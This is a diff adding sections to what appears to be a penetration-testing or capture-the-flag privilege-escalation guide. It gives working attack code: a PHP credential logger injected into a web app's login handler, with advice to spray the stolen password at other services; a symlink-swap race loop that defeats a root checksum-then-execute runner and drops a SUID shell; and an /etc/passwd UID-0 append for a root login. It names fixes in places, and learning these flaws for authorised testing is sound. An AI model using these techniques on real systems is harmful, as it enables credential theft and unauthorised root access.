@@ -340,6 +340,30 @@ cat /etc/systemd/system/<name>.service | grep -E 'User=|ExecStart='
 ls -la /var/log/<name>.log
 ```
 
+**When you cannot read the privileged script but it authenticates through a web
+app whose files you *can* write, capture the credential in transit.** A common
+shape: `pspy` shows a root cron running e.g. `python3 /root/scripts/login.py`
+that logs into a local web app on a loop; the script is under `/root` and
+unreadable, but the web app's document root is writable by your service account
+(check with `find / -writable` — a frontend owned by the service user is
+routine). Don't try to read the password — make the login hand it to you. Plant
+a minimal, non-destructive logger at the entry point that persists the submitted
+credentials, then wait for the job to fire:
+
+```php
+// prepended to the app's login handler (e.g. Zabbix index.php), guarded so it never breaks the page
+if(isset($_REQUEST['password'])&&$_REQUEST['password']!==''){@file_put_contents($CF,($_REQUEST['name']??'').':'.$_REQUEST['password']."\n",FILE_APPEND);}
+```
+
+Two gotchas that make it look like it "didn't work": PHP **OPcache** may serve
+the pre-edit bytecode (fine if `validate_timestamps=On`, else you cannot force a
+reload without root), and **`open_basedir`** (very common on hardened app vhosts)
+blocks writes to `/tmp` — put the capture file *inside* the document root, which
+`open_basedir` always permits. Then treat the captured secret as a
+cross-boundary credential and spray it: the monitoring login you hooked is often
+the admin of the *other* service on the box (a CI server, a forge) that runs as
+root. Restore the original file from a backup afterwards — this is an artifact.
+
 The recurring bug class is a root job joining an attacker-influenced name onto a
 directory:
 
@@ -375,6 +399,64 @@ name. The clean fix is `realpath`/`readlink -f` + a prefix-containment test, so
 name that as the vulnerability. **Prefer this read/logic flaw to racing a
 `rm`+recreate symlink guard elsewhere in the same script** — enumerate every
 subcommand of a root-run tool before committing to a fragile write race.
+
+**A root process that creates its *own* output file through a symlink you planted
+hands you the target's contents *and often its mode*.** Distinct from the
+read/chain-bypass above: here the root job does `open(logpath, O_CREAT, 0666)`
+(or a create+chmod) on a path *you* pre-seeded as a symlink to a file you cannot
+write. The create follows the symlink, so the sensitive target is (re)opened as
+root and left group/other-writable. The escalation is then trivial and needs no
+control over the *content* the daemon writes: after the root create, `ls -l` the
+target — if it is now `0666`, you write it directly. Recurring shape: a
+monitoring/agent/maintenance daemon (often reachable via an over-broad
+`sudo <tool> *` rule) whose per-user error/state file lives in a world-writable
+dir. Pin the tool's version and check its CVEs before hand-rolling — this class
+has named entries. The general fix to name: create logs `O_EXCL`, non-following,
+0640, in a root-owned 0755 dir.
+
+**A root job that checksum-validates a file and then executes it is a TOCTOU
+whenever the file lives in a directory you can write — even if the file itself is
+root-owned and unwritable.** The recurring shape is a "secure runner":
+
+```bash
+sig=$(md5sum "$script"); [ "$sig" = "$whitelisted" ] && "$script"   # as root
+```
+
+The check (`md5sum` opens the path) and the use (the shell opens it again to
+exec) are two separate opens of a path an unprivileged principal controls
+between them. Directory-write is enough — you never touch the file, you *replace
+the directory entry*. Keep the legitimate file (its md5 matches) and an evil
+payload both staged, and flip a symlink of the runner's name between them in a
+tight loop with atomic renames:
+
+```bash
+while :; do
+  ln -sf /stage/evil.sh d/.t; mv -Tf d/.t d/run.sh      # exec window
+  ln -sf /stage/good.sh d/.t; mv -Tf d/.t d/run.sh      # md5sum window
+  [ -u /var/tmp/.rb ] && break                          # payload dropped a SUID bash
+done
+```
+
+`md5sum` reading `good` (matches) while the exec catches `evil` wins; a
+per-minute cron usually lands it within one or two cycles. The dir being
+group-writable (`drwxrwsr-x root <grp>`, and you are in `<grp>`) is the whole
+bug — nothing about the checksum is bypassed, the validated bytes and the run
+bytes are simply allowed to differ. **Two operational notes that cost time here:**
+`cp src symlink` *follows* the symlink and writes the target, so cleanup must
+`rm` the planted symlink before writing the real file back; and restoring the
+runner to `root:root` needs root, so spend the won race to also `cp`+`chown` the
+original file back into place before you drop the privilege. The fix to name:
+copy the script to a root-only path, checksum *that copy*, exec *that copy* — or
+simply make the directory root-owned and non-group-writable. Validating a file an
+unprivileged group can swap is not a boundary. Prefer this to any write race
+elsewhere, and it is cleaner than a kernel bug.
+
+When the target you gain write to is `/etc/passwd`, **append a UID-0 line and
+delete it afterward — never `cp`-overwrite.** Public PoCs clobber the whole file
+with one line; that roots you but destroys every other account and is a
+gratuitous mess on someone's box. `printf 'pwn::0:0::/root:/bin/bash\n' >>
+/etc/passwd; su pwn` then `sed -i '/^pwn::0:0:/d' /etc/passwd` restores it
+byte-for-byte.
 
 Note that `git` is a common untrusted source here — and that git's own
 restrictions are a porcelain behaviour, not a format one. `git add` refuses a
